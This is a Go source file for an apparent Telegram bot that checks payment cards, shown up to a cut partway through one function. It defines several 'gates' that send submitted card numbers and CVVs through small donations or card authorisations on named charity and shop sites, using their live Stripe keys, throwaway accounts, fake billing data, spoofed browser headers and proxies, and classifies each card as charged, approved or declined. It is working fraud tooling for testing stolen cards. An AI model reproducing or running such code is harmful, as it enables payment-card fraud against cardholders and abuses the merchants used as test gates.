package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	_ "github.com/bdandy/go-socks4"
	tele "gopkg.in/telebot.v4"
	"golang.org/x/net/proxy"
)

// stripeCheckFn is the common signature for all Stripe gate check functions.
type stripeCheckFn func(cc, mm, yy, cvv, proxyURL string) *CheckResult

// ─────────────── Constants ───────────────────────────────────────────

const (
	// Donation gate — donations.davidmaraga.com $3 USD
	stripeDonationPK  = "pk_live_51ReQIiKyyNbRBgGl4sd6Jq0A2GbUKQC0LieMLuxQvpEMccLtQtxTmemXZRRvRMNwiUyPlxYiTNX4ZmjSx8x32EsN00VOpOjKfb"
	stripeDonationVer = "2025-03-31.basil"

	// Auth gate — propski.co.uk (UK WooCommerce, no charge)
	stripeAuthPK = "pk_live_4kM0zYmj8RdKCEz9oaVNLhvl00GpRole3Q"

	// Checkout session gate — alayninternational.org $1 USD
	stripeCheckoutPK = "pk_live_51LI8bMG9sKJ1oFCajC3XXk0SU6AhSK3igHVfKi7oHLK7u7DlMzwhP7uFGW0CQR0Fzbu5US1bOZ9F1LOhGaQ9goES00athPxu0Y"

	// SecondStork gate — secondstork.org $5
	stripeSecondStorkPK   = "pk_live_51I8ZwGAifsV2HHSa0jgLD6S16izScuihE2WtExBWzbyBsawOazS9cjt1aFyBsdSuK9nYwDD7Vh7LUOoa0Evb7Evb00yVEpTIJL"
	stripeSecondStorkAcct = "acct_1QKSXbCpkitTuUwe"

	// Dollar gate — onamissionkc.org $1 USD
	stripeDollarPK   = "pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e"
	stripeDollarAcct = "acct_1LwocDFHMGxIu0Ep"
)

// ─────────────── HTTP helpers ────────────────────────────────────────

func newHTTPClient(proxyURL string, timeout time.Duration) *http.Client {
	transport := &http.Transport{
		TLSHandshakeTimeout: 10 * time.Second,
		DisableKeepAlives:   true,
	}
	if proxyURL != "" {
		applyProxyToTransport(transport, proxyURL)
	}
	return &http.Client{Transport: transport, Timeout: timeout}
}

func newCookieClient(proxyURL string, timeout time.Duration) *http.Client {
	jar, _ := cookiejar.New(nil)
	t := &http.Transport{TLSHandshakeTimeout: 10 * time.Second}
	if proxyURL != "" {
		applyProxyToTransport(t, proxyURL)
	}
	return &http.Client{Transport: t, Timeout: timeout, Jar: jar}
}

func applyProxyToTransport(t *http.Transport, proxyURL string) {
	parsed, err := url.Parse(proxyURL)
	if err != nil {
		return
	}
	switch parsed.Scheme {
	case "socks5", "socks5h":
		var auth *proxy.Auth
		if parsed.User != nil {
			pw, _ := parsed.User.Password()
			auth = &proxy.Auth{User: parsed.User.Username(), Password: pw}
		}
		d, err := proxy.SOCKS5("tcp", parsed.Host, auth, &net.Dialer{Timeout: 10 * time.Second})
		if err == nil {
			t.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
				return d.Dial(network, addr)
			}
		}
	case "socks4", "socks4a":
		d, err := proxy.FromURL(parsed, &net.Dialer{Timeout: 10 * time.Second})
		if err == nil {
			t.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
				return d.Dial(network, addr)
			}
		}
	default:
		t.Proxy = http.ProxyURL(parsed)
	}
}

// ─────────────── String helpers ─────────────────────────────────────

func stripeRandStr(n int, upper bool) string {
	letters := "abcdefghijklmnopqrstuvwxyz"
	if upper {
		letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	}
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// stripeFullYear: "26" → "2026", "2026" → "2026"
func stripeFullYear(yy string) string {
	if len(yy) == 2 {
		return "20" + yy
	}
	return yy
}

// stripeShortYear: "2026" → "26", "26" → "26"
func stripeShortYear(yy string) string {
	if len(yy) > 2 {
		return yy[len(yy)-2:]
	}
	return yy
}

// stripeMMPad zero-pads a month string: "1" → "01", "12" → "12"
func stripeMMPad(mm string) string {
	if len(mm) == 1 {
		return "0" + mm
	}
	return mm
}

// ─────────────── Gate: Stripe Donation ($3 USD) — /str4 ─────────────
// Site: donations.davidmaraga.com

func checkStripeDonationCard(cc, mm, yy, cvv, proxyURL string) *CheckResult {
	card := cc + "|" + mm + "|" + yy + "|" + cvv

	fail := func(code string) *CheckResult {
		return &CheckResult{
			Card:       card,
			Status:     StatusError,
			StatusCode: code,
			Gateway:    "Stripe Donation",
			Retryable:  true,
		}
	}

	client := newHTTPClient(proxyURL, 30*time.Second)

	// Step 1: create payment intent via charity site
	payload, _ := json.Marshal(map[string]interface{}{
		"paymentMethod":   "stripe",
		"amount":          3,
		"currency":        "USD",
		"donorName":       stripeRandStr(4, true),
		"donorEmail":      stripeRandStr(6, false) + "@gmail.com",
		"displayDonation": false,
		"donationType":    "one-time",
		"isAnonymous":     false,
	})

	req, _ := http.NewRequest("POST",
		"https://donations.davidmaraga.com/api/payments",
		strings.NewReader(string(payload)))
	req.Header.Set("Host", "donations.davidmaraga.com")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Origin", "https://donations.davidmaraga.com")
	req.Header.Set("Referer", "https://donations.davidmaraga.com/")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[STR4] step1 timeout card=%s proxy=%s err=%v\n", card, proxyURL, err)
		return fail("TIMEOUT")
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	if resp.StatusCode != 200 {
		fmt.Printf("[STR4] step1 bad status=%d card=%s body=%s\n", resp.StatusCode, card, bodyStr)
		return fail(fmt.Sprintf("CREATE_FAILED_%d", resp.StatusCode))
	}

	csMatch := regexp.MustCompile(`"clientSecret":"([^"]+)"`).FindStringSubmatch(bodyStr)
	piMatch := regexp.MustCompile(`"clientSecret":"pi_([^_]+)_`).FindStringSubmatch(bodyStr)
	if len(csMatch) < 2 || len(piMatch) < 2 {
		fmt.Printf("[STR4] step1 parse failed card=%s body=%s\n", card, bodyStr)
		return fail("PARSE_FAILED")
	}
	clientSecret := csMatch[1]
	piID := "pi_" + piMatch[1]

	// Step 2: confirm payment intent via Stripe API
	confirmData := url.Values{
		"return_url":                                             {"https://donations.davidmaraga.com/donation-success?provider=stripe"},
		"payment_method_data[type]":                              {"card"},
		"payment_method_data[card][number]":                      {cc},
		"payment_method_data[card][cvc]":                         {cvv},
		"payment_method_data[card][exp_year]":                    {yy},
		"payment_method_data[card][exp_month]":                   {mm},
		"payment_method_data[billing_details][address][country]": {"PK"},
		"payment_method_data[payment_user_agent]":                {"stripe.js/eeaff566a9; stripe-js-v3/eeaff566a9; payment-element"},
		"key":             {stripeDonationPK},
		"_stripe_version": {stripeDonationVer},
		"client_secret":   {clientSecret},
	}

	req2, _ := http.NewRequest("POST",
		"https://api.stripe.com/v1/payment_intents/"+piID+"/confirm",
		strings.NewReader(confirmData.Encode()))
	req2.Header.Set("Host", "api.stripe.com")
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0")
	req2.Header.Set("Accept", "application/json")
	req2.Header.Set("Origin", "https://js.stripe.com")
	req2.Header.Set("Referer", "https://js.stripe.com/")

	resp2, err := client.Do(req2)
	if err != nil {
		fmt.Printf("[STR4] step2 timeout card=%s pi=%s err=%v\n", card, piID, err)
		return fail("CONFIRM_TIMEOUT")
	}
	defer resp2.Body.Close()
	body2, _ := io.ReadAll(resp2.Body)
	b2 := string(body2)
	fmt.Printf("[STR4] step2 status=%d card=%s response=%s\n", resp2.StatusCode, card, b2)

	if strings.Contains(b2, `"status":"succeeded"`) {
		return &CheckResult{
			Card:       card,
			Status:     StatusCharged,
			StatusCode: "PAYMENT_SUCCEEDED",
			Amount:     "3.00",
			Currency:   "USD",
			Gateway:    "Stripe Donation",
		}
	}
	if strings.Contains(b2, `"status":"requires_action"`) {
		return &CheckResult{
			Card:       card,
			Status:     StatusApproved,
			StatusCode: "3DS_REQUIRED",
			Gateway:    "Stripe Donation",
		}
	}

	// Parse decline reason
	msgMatch := regexp.MustCompile(`"message":\s*"([^"]+)"`).FindStringSubmatch(b2)
	dcMatch := regexp.MustCompile(`"decline_code":\s*"([^"]+)"`).FindStringSubmatch(b2)
	msg := "DECLINED"
	if len(msgMatch) >= 2 {
		msg = msgMatch[1]
	}
	if len(dcMatch) >= 2 {
		msg += " → " + strings.ToUpper(dcMatch[1])
	}
	return &CheckResult{
		Card:       card,
		Status:     StatusDeclined,
		StatusCode: msg,
		Gateway:    "Stripe Donation",
	}
}

// ─────────────── Gate: Stripe Auth (UK WooCommerce) — /str ──────────
// Site: propski.co.uk — adds card as payment method, no charge

func checkStripeAuthCard(cc, mm, yy, cvv, proxyURL string) *CheckResult {
	card := cc + "|" + mm + "|" + yy + "|" + cvv
	fail := func(code string) *CheckResult {
		return &CheckResult{Card: card, Status: StatusError, StatusCode: code, Gateway: "Stripe Auth", Retryable: true}
	}

	const (
		baseURL = "https://www.propski.co.uk"
		authUA  = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
	)
	email := stripeRandStr(6, false) + fmt.Sprintf("%d", rand.Intn(89)+10) + "@gmail.com"
	client := newCookieClient(proxyURL, 60*time.Second)

	doGet := func(u, referer string) (string, int, error) {
		req, _ := http.NewRequest("GET", u, nil)
		req.Header.Set("User-Agent", authUA)
		if referer != "" {
			req.Header.Set("Referer", referer)
		}
		resp, err := client.Do(req)
		if err != nil {
			return "", 0, err
		}
		defer resp.Body.Close()
		b, _ := io.ReadAll(resp.Body)
		return string(b), resp.StatusCode, nil
	}
	doPost := func(u string, data url.Values, referer string) (string, int, error) {
		req, _ := http.NewRequest("POST", u, strings.NewReader(data.Encode()))
		req.Header.Set("User-Agent", authUA)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Origin", baseURL)
		if referer != "" {
			req.Header.Set("Referer", referer)
		}
		resp, err := client.Do(req)
		if err != nil {
			return "", 0, err
		}
		defer resp.Body.Close()
		b, _ := io.ReadAll(resp.Body)
		return string(b), resp.StatusCode, nil
	}

	// Step 1: Get registration nonce
	html1, _, err := doGet(baseURL+"/my-account/", baseURL+"/my-account/")
	if err != nil {
		fmt.Printf("[STR] auth step1 err card=%s: %v\n", card, err)
		return fail("TIMEOUT")
	}
	regNonceM := regexp.MustCompile(`name="woocommerce-register-nonce" value="([^"]+)"`).FindStringSubmatch(html1)
	if len(regNonceM) < 2 {
		fmt.Printf("[STR] auth step1 no reg nonce card=%s\n", card)
		return fail("REG_NONCE_FAIL")
	}

	// Step 2: Register account
	regData := url.Values{
		"email":                              {email},
		"wc_order_attribution_session_entry": {baseURL + "/my-account/"},
		"wc_order_attribution_user_agent":    {authUA},
		"woocommerce-register-nonce":         {regNonceM[1]},
		"_wp_http_referer":                   {"/my-account/"},
		"register":                           {"Register"},
	}
	_, regStatus, err := doPost(baseURL+"/my-account/?action=register", regData, baseURL+"/my-account/")
	if err != nil {
		return fail("TIMEOUT")
	}
	if regStatus != 200 && regStatus != 302 {
		fmt.Printf("[STR] auth step2 bad status=%d card=%s\n", regStatus, card)
		return fail(fmt.Sprintf("REG_FAIL_%d", regStatus))
	}

	// Step 3: Get billing address nonce
	addrURL := baseURL + "/my-account/edit-address/billing/"
	html3, _, err := doGet(addrURL, baseURL+"/my-account/edit-address/")
	if err != nil {
		return fail("TIMEOUT")
	}
	addrNonceM := regexp.MustCompile(`name="woocommerce-edit-address-nonce" value="([^"]+)"`).FindStringSubmatch(html3)
	if len(addrNonceM) < 2 {
		fmt.Printf("[STR] auth step3 no addr nonce card=%s\n", card)
		return fail("ADDR_NONCE_FAIL")
	}

	// Step 4: Save billing address
	addrData := url.Values{
		"billing_first_name":             {"Mama"},
		"billing_last_name":              {"Babbaw"},
		"billing_company":                {""},
		"billing_country":                {"AU"},
		"billing_address_1":              {"Street allen 45"},
		"billing_address_2":              {""},
		"billing_city":                   {"New York"},
		"billing_state":                  {"NSW"},
		"billing_postcode":               {"10080"},
		"billing_phone":                  {"15525546325"},
		"billing_email":                  {email},
		"save_address":                   {"Save address"},
		"woocommerce-edit-address-nonce": {addrNonceM[1]},
		"_wp_http_referer":               {"/my-account/edit-address/billing/"},
		"action":                         {"edit_address"},
	}
	if _, _, err = doPost(addrURL, addrData, addrURL); err != nil {
		return fail("TIMEOUT")
	}

	// Step 5: Get add-payment-method nonce
	pmURL := baseURL + "/my-account/add-payment-method/"
	html5, _, err := doGet(pmURL, baseURL+"/my-account/payment-methods/")
	if err != nil {
		return fail("TIMEOUT")
	}
	addNonceM := regexp.MustCompile(`"add_card_nonce"\s*:\s*"([^"]+)"`).FindStringSubmatch(html5)
	if len(addNonceM) < 2 {
		fmt.Printf("[STR] auth step5 no add_card_nonce card=%s\n", card)
		return fail("ADD_NONCE_FAIL")
	}
	addCardNonce := addNonceM[1]

	// Step 6: Create Stripe source
	srcData := url.Values{
		"referrer":           {baseURL},
		"type":               {"card"},
		"owner[email]":       {email},
		"card[number]":       {cc},
		"card[cvc]":          {cvv},
		"card[exp_month]":    {mm},
		"card[exp_year]":     {stripeFullYear(yy)},
		"guid":               {"5f072a89-96d0-4d98-9c15-e2120acb9f6385f761"},
		"muid":               {"2e70679e-a504-4e9c-ad79-a9bcf27bc72a6b90d5"},
		"sid":                {"18d15059-63f6-4de6-b243-999e709ea0725ea079"},
		"pasted_fields":      {"number"},
		"payment_user_agent": {"stripe.js/8702d4c73a; stripe-js-v3/8702d4c73a; split-card-element"},
		"time_on_page":       {"36611"},
		"client_attribution_metadata[client_session_id]":            {"a36626e3-53c5-4045-9c7c-d9a4bb30ffd7"},
		"client_attribution_metadata[merchant_integration_source]":  {"elements"},
		"client_attribution_metadata[merchant_integration_subtype]": {"cardNumber"},
		"client_attribution_metadata[merchant_integration_version]": {"2017"},
		"key": {stripeAuthPK},
	}
	sReq, _ := http.NewRequest("POST", "https://api.stripe.com/v1/sources", strings.NewReader(srcData.Encode()))
	sReq.Header.Set("accept", "application/json")
	sReq.Header.Set("content-type", "application/x-www-form-urlencoded")
	sReq.Header.Set("origin", "https://js.stripe.com")
	sReq.Header.Set("referer", "https://js.stripe.com/")
	sReq.Header.Set("user-agent", authUA)
	sResp, err := client.Do(sReq)
	if err != nil {
		return fail("STRIPE_TIMEOUT")
	}
	defer sResp.Body.Close()
	sBody, _ := io.ReadAll(sResp.Body)
	fmt.Printf("[STR] auth step6 status=%d card=%s response=%s\n", sResp.StatusCode, card, string(sBody))

	var sJSON map[string]interface{}
	json.Unmarshal(sBody, &sJSON)
	pmid, _ := sJSON["id"].(string)
	if pmid == "" {
		if errM := regexp.MustCompile(`"message":\s*"([^"]+)"`).FindStringSubmatch(string(sBody)); len(errM) >= 2 {
			return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: errM[1], Gateway: "Stripe Auth"}
		}
		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: "PM_CREATE_FAIL", Gateway: "Stripe Auth"}
	}

	// Step 7: Attach source to WooCommerce
	attachData := url.Values{
		"stripe_source_id": {pmid},
		"nonce":            {addCardNonce},
	}
	attachBody, attachStatus, err := doPost(baseURL+"/?wc-ajax=wc_stripe_create_setup_intent", attachData, pmURL)
	if err != nil {
		return fail("TIMEOUT")
	}
	fmt.Printf("[STR] auth step7 status=%d card=%s response=%s\n", attachStatus, card, attachBody)

	var aJSON map[string]interface{}
	json.Unmarshal([]byte(attachBody), &aJSON)

	if attachStatus == 200 && aJSON != nil {
		sv, _ := aJSON["status"].(string)
		switch sv {
		case "success":
			return &CheckResult{Card: card, Status: StatusApproved, StatusCode: "CARD_APPROVED", Gateway: "Stripe Auth"}
		case "requires_action":
			return &CheckResult{Card: card, Status: StatusApproved, StatusCode: "3DS_REQUIRED", Gateway: "Stripe Auth"}
		default:
			msg := "DECLINED"
			if errObj, ok := aJSON["error"].(map[string]interface{}); ok {
				if m, ok := errObj["message"].(string); ok {
					msg = m
				}
			}
			return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: msg, Gateway: "Stripe Auth"}
		}
	}
	if attachStatus == 400 && aJSON != nil {
		msg := "Declined"
		if data, ok := aJSON["data"].(map[string]interface{}); ok {
			if errObj, ok := data["error"].(map[string]interface{}); ok {
				if m, ok := errObj["message"].(string); ok {
					msg = m
				}
			}
		}
		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: msg, Gateway: "Stripe Auth"}
	}
	return fail(fmt.Sprintf("ATTACH_%d", attachStatus))
}

// ─────────────── Gate: Stripe Checkout Session ($1 USD) — /str1 ─────
// Site: alayninternational.org

func checkStripeCheckoutCard(cc, mm, yy, cvv, proxyURL string) *CheckResult {
	card := cc + "|" + mm + "|" + yy + "|" + cvv
	fail := func(code string) *CheckResult {
		return &CheckResult{Card: card, Status: StatusError, StatusCode: code, Gateway: "Stripe UHQ $1", Retryable: true}
	}
	client := newCookieClient(proxyURL, 60*time.Second)
	cUA := "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0"

	// Step 1: Create billing session
	r1, err := client.Do(func() *http.Request {
		req, _ := http.NewRequest("POST",
			"https://www.alayninternational.org/wp-admin/admin-ajax.php",
			strings.NewReader("cause=SAD&country_dropdown=Any&currency=USD&amount=1&fname=PROO&sname=REAL&email=becaso6239@bialode.com&country=GB&action=sagepayformBilling"))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", cUA)
		return req
	}())
	if err != nil {
		fmt.Printf("[STR1] step1 err card=%s: %v\n", card, err)
		return fail("TIMEOUT")
	}
	defer r1.Body.Close()
	b1, _ := io.ReadAll(r1.Body)
	s1 := string(b1)
	if !strings.Contains(s1, `href = "`) {
		fmt.Printf("[STR1] step1 no session card=%s body=%s\n", card, s1)
		return fail("NO_SESSION")
	}
	sessionPath := strings.Split(strings.Split(s1, `href = "`)[1], `"`)[0]

	// Step 2: Get order ID
	r2, err := client.Do(func() *http.Request {
		req, _ := http.NewRequest("GET", "https://www.alayninternational.org"+sessionPath, nil)
		req.Header.Set("User-Agent", cUA)
		return req
	}())
	if err != nil {
		return fail("TIMEOUT")
	}
	defer r2.Body.Close()
	b2, _ := io.ReadAll(r2.Body)
	s2 := string(b2)
	if !strings.Contains(s2, "orderID: '") {
		fmt.Printf("[STR1] step2 no orderID card=%s\n", card)
		return fail("NO_ORDER_ID")
	}
	orderID := strings.Split(strings.Split(s2, "orderID: '")[1], "'")[0]

	// Step 3: Create price
	pricePayload, _ := json.Marshal(map[string]interface{}{
		"productID": "SAD", "productName": "Sadaqa", "amount": 1,
		"description": "", "ProductImage": "", "currency": "usd",
	})
	r3, err := client.Do(func() *http.Request {
		req, _ := http.NewRequest("POST",
			"https://www.alayninternational.org/wp-content/plugins/alayn-payment-form-stripe-checkout/form/ecommerce/create-price.php",
			strings.NewReader(string(pricePayload)))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", cUA)
		return req
	}())
	if err != nil {
		return fail("TIMEOUT")
	}
	defer r3.Body.Close()
	var priceData map[string]interface{}
	json.NewDecoder(r3.Body).Decode(&priceData)
	priceID, _ := priceData["priceId"].(string)
	if priceID == "" {
		fmt.Printf("[STR1] step3 no price card=%s data=%v\n", card, priceData)
		return fail("NO_PRICE")
	}

	// Step 4: Create checkout session
	csPayload, _ := json.Marshal(map[string]interface{}{
		"lineItems":       []map[string]interface{}{{"price": priceID, "quantity": 1}},
		"cartTotalAmount": 1,
		"firstName":       "H",
		"lastName":        "REAL",
		"email":           "becaso6239@bialode.com",
		"orderID":         orderID,
		"phone":           "",
		"notes":           "",
		"crmCode":         "SAD",
		"causeName":       "Sadaqa",
		"dropdDownValue":  "Any",
		"successUrl":      "https://www.alayninternational.org/donate/confirm-payment/",
		"cancelUrl":       "https://www.alayninternational.org/donate/confirm-payment/",
	})
	r4, err := client.Do(func() *http.Request {
		req, _ := http.NewRequest("POST",
			"https://www.alayninternational.org/wp-content/plugins/alayn-payment-form-stripe-checkout/form/ecommerce/create-checkout-session.php",
			strings.NewReader(string(csPayload)))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Origin", "https://www.alayninternational.org")
		req.Header.Set("Referer", "https://www.alayninternational.org"+sessionPath)
		req.Header.Set("User-Agent", cUA)
		return req
	}())
	if err != nil {
		return fail("TIMEOUT")
	}
	defer r4.Body.Close()
	var csData map[string]interface{}
	json.NewDecoder(r4.Body).Decode(&csData)
	clientSecret, _ := csData["clientSecret"].(string)
	if !strings.Contains(clientSecret, "_secret_") {
		fmt.Printf("[STR1] step4 no cs card=%s csData=%v\n", card, csData)
		return fail("NO_CS")
	}
	csID := strings.SplitN(clientSecret, "_secret_", 2)[0]

	stripeHdr1 := map[string]string{
		"Host":         "api.stripe.com",
		"User-Agent":   cUA,
		"Accept":       "application/json",
		"Referer":      "https://js.stripe.com/",
		"Content-Type": "application/x-www-form-urlencoded",
		"Origin":       "https://js.stripe.com",
	}

	// Step 5: Create payment method
	pmData := url.Values{
		"type":                              {"card"},
		"card[number]":                      {cc},
		"card[cvc]":                         {cvv},
		"card[exp_month]":                   {stripeMMPad(mm)},
		"card[exp_year]":                    {stripeShortYear(yy)},
		"billing_details[name]":             {"H"},
		"billing_details[email]":            {"becaso6239@bialode.com"},
		"billing_details[address][country]": {"PK"},
		"key":                               {stripeCheckoutPK},
		"payment_user_agent":                {"stripe.js/eeaff566a9; stripe-js-v3/eeaff566a9; checkout"},
		"client_attribution_metadata[client_session_id]":             {"4f4df5df-0d3d-488c-9801-89762e1ae6cf"},
		"client_attribution_metadata[merchant_integration_source]":   {"checkout"},
		"client_attribution_metadata[merchant_integration_version]":  {"embedded_checkout"},
		"client_attribution_metadata[payment_method_selection_flow]": {"automatic"},
	}
	req5, _ := http.NewRequest("POST", "https://api.stripe.com/v1/payment_methods", strings.NewReader(pmData.Encode()))
	for k, v := range stripeHdr1 {
		req5.Header.Set(k, v)
	}
	r5, err := client.Do(req5)
	if err != nil {
		return fail("TIMEOUT")
	}
	defer r5.Body.Close()
	r5b, _ := io.ReadAll(r5.Body)
	var pmRes map[string]interface{}
	json.Unmarshal(r5b, &pmRes)
	pmID1, _ := pmRes["id"].(string)
	if pmID1 == "" {
		errMsg := "NO_PM"
		if e, ok := pmRes["error"].(map[string]interface{}); ok {
			if m, ok := e["message"].(string); ok {
				errMsg = m
			}
		}
		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: errMsg, Gateway: "Stripe UHQ $1"}
	}

	// Step 6: Confirm
	confData := url.Values{
		"eid":                          {"NA"},
		"payment_method":               {pmID1},
		"expected_amount":              {"100"},
		"expected_payment_method_type": {"card"},
		"key":                          {stripeCheckoutPK},
	}
	req6, _ := http.NewRequest("POST",
		"https://api.stripe.com/v1/payment_pages/"+csID+"/confirm",
		strings.NewReader(confData.Encode()))
	for k, v := range stripeHdr1 {
		req6.Header.Set(k, v)
	}
	r6, err := client.Do(req6)
	if err != nil {
		return fail("CONFIRM_TIMEOUT")
	}
	defer r6.Body.Close()
	r6b, _ := io.ReadAll(r6.Body)
	fmt.Printf("[STR1] step6 status=%d card=%s response=%s\n", r6.StatusCode, card, string(r6b))

	var result1 map[string]interface{}
	json.Unmarshal(r6b, &result1)

	if errObj, ok := result1["error"].(map[string]interface{}); ok {
		decCode, _ := errObj["decline_code"].(string)
		errCode, _ := errObj["code"].(string)
		msgStr, _ := errObj["message"].(string)
		if msgStr == "" {
			msgStr = "DECLINED"
		}
		if decCode == "insufficient_funds" {
			return &CheckResult{Card: card, Status: StatusApproved, StatusCode: "INSUFFICIENT_FUNDS", Gateway: "Stripe UHQ $1"}
		}
		if decCode == "authentication_required" || errCode == "authentication_required" {
			return &CheckResult{Card: card, Status: StatusApproved, StatusCode: "3DS_REQUIRED", Gateway: "Stripe UHQ $1"}
		}
		if decCode != "" {
			return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: "DECLINED > " + strings.ToUpper(decCode), Gateway: "Stripe UHQ $1"}
		}
		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: msgStr, Gateway: "Stripe UHQ $1"}
	}

	pi1, _ := result1["payment_intent"].(map[string]interface{})
	piStatus1 := ""
	if pi1 != nil {
		piStatus1, _ = pi1["status"].(string)
	}
	rootStatus1, _ := result1["status"].(string)

	if piStatus1 == "succeeded" || rootStatus1 == "complete" {
		return &CheckResult{Card: card, Status: StatusCharged, StatusCode: "CHARGED_$1", Amount: "1.00", Currency: "USD", Gateway: "Stripe UHQ $1"}
	}
	if piStatus1 == "requires_action" {
		return &CheckResult{Card: card, Status: StatusApproved, StatusCode: "3DS_REQUIRED", Gateway: "Stripe UHQ $1"}
	}
	if piStatus1 == "requires_payment_method" && pi1 != nil {
		if lastErr, ok := pi1["last_payment_error"].(map[string]interface{}); ok {
			dc, _ := lastErr["decline_code"].(string)
			msg, _ := lastErr["message"].(string)
			if msg == "" {
				msg = "DECLINED"
			}
			if dc == "insufficient_funds" {
				return &CheckResult{Card: card, Status: StatusApproved, StatusCode: "INSUFFICIENT_FUNDS", Gateway: "Stripe UHQ $1"}
			}
			if dc != "" {
				return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: "DECLINED > " + strings.ToUpper(dc), Gateway: "Stripe UHQ $1"}
			}
			return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: msg, Gateway: "Stripe UHQ $1"}
		}
	}
	return fail("PI:" + piStatus1)
}

// ─────────────── Gate: Stripe SecondStork ($5) — /str2 ──────────────
// Site: secondstork.org

func checkStripeSecondStorkCard(cc, mm, yy, cvv, proxyURL string) *CheckResult {
	card := cc + "|" + mm + "|" + yy + "|" + cvv
	fail := func(code string) *CheckResult {
		return &CheckResult{Card: card, Status: StatusError, StatusCode: code, Gateway: "Stripe UHQ $5", Retryable: true}
	}
	client := newCookieClient(proxyURL, 60*time.Second)
	ssUA := "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0"

	stripeHdr2 := map[string]string{
		"Accept":       "application/json",
		"Referer":      "https://js.stripe.com/",
		"Content-Type": "application/x-www-form-urlencoded",
		"Origin":       "https://js.stripe.com",
		"User-Agent":   ssUA,
	}

	// Step 1: Get page, extract nonces
	r1, err := client.Do(func() *http.Request {
		req, _ := http.NewRequest("GET", "https://secondstork.org/donations/donation-form/", nil)
		req.Header.Set("User-Agent", ssUA)
		return req
	}())
	if err != nil {
		fmt.Printf("[STR2] step1 err card=%s: %v\n", card, err)
		return fail("TIMEOUT")
	}
	defer r1.Body.Close()
	pageB, _ := io.ReadAll(r1.Body)
	page := string(pageB)

	if !strings.Contains(page, `frm_submit_entry_34" value="`) {
		fmt.Printf("[STR2] step1 no form card=%s\n", card)
		return fail("NO_FORM")
	}
	frmNonce := strings.Split(strings.Split(page, `frm_submit_entry_34" value="`)[1], `"`)[0]
	actionNonce := ""
	if strings.Contains(page, `"nonce":"`) {
		actionNonce = strings.Split(strings.Split(page, `"nonce":"`)[1], `"`)[0]
	}
	if frmNonce == "" || actionNonce == "" {
		fmt.Printf("[STR2] step1 no nonce card=%s frm=%s act=%s\n", card, frmNonce, actionNonce)
		return fail("NO_NONCE")
	}

	// Step 2: Create Stripe token
	tokData := url.Values{
		"card[number]":        {cc},
		"card[cvc]":           {cvv},
		"card[exp_month]":     {stripeMMPad(mm)},
		"card[exp_year]":      {stripeShortYear(yy)},
		"card[name]":          {"H"},
		"card[address_line1]": {"ST 26"},
		"card[address_city]":  {"NY"},
		"card[address_zip]":   {"10080"},
		"key":                 {stripeSecondStorkPK},
		"_stripe_account":     {stripeSecondStorkAcct},
	}
	req2, _ := http.NewRequest("POST", "https://api.stripe.com/v1/tokens", strings.NewReader(tokData.Encode()))
	for k, v := range stripeHdr2 {
		req2.Header.Set(k, v)
	}
	r2, err := client.Do(req2)
	if err != nil {
		return fail("TIMEOUT")
	}
	defer r2.Body.Close()
	r2b, _ := io.ReadAll(r2.Body)
	fmt.Printf("[STR2] step2 token status=%d card=%s response=%s\n", r2.StatusCode, card, string(r2b))

	var tokRes map[string]interface{}
	json.Unmarshal(r2b, &tokRes)
	tokenID, _ := tokRes["id"].(string)
	brand := "Unknown"
	if cardObj, ok := tokRes["card"].(map[string]interface{}); ok {
		if b, ok := cardObj["brand"].(string); ok {
			brand = b
		}
	}
	if tokenID == "" {
		msg := "NO_TOKEN"
		if e, ok := tokRes["error"].(map[string]interface{}); ok {
			if m, ok := e["message"].(string); ok {
				msg = m
			}
		}
		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: msg, Gateway: "Stripe UHQ $5"}
	}

	// Step 3: Create payment method
	pmData2 := url.Values{
		"type":                                  {"card"},
		"billing_details[address][line1]":       {"ST 26"},
		"billing_details[address][city]":        {"NY"},
		"billing_details[address][postal_code]": {"10080"},
		"billing_details[name]":                 {"H"},
		"card[number]":                          {cc},
		"card[cvc]":                             {cvv},
		"card[exp_month]":                       {stripeMMPad(mm)},
		"card[exp_year]":                        {stripeShortYear(yy)},
		"payment_user_agent":                    {"stripe.js/eeaff566a9; stripe-js-v3/eeaff566a9; card-element"},
		"key":                                   {stripeSecondStorkPK},
		"_stripe_account":                       {stripeSecondStorkAcct},
	}
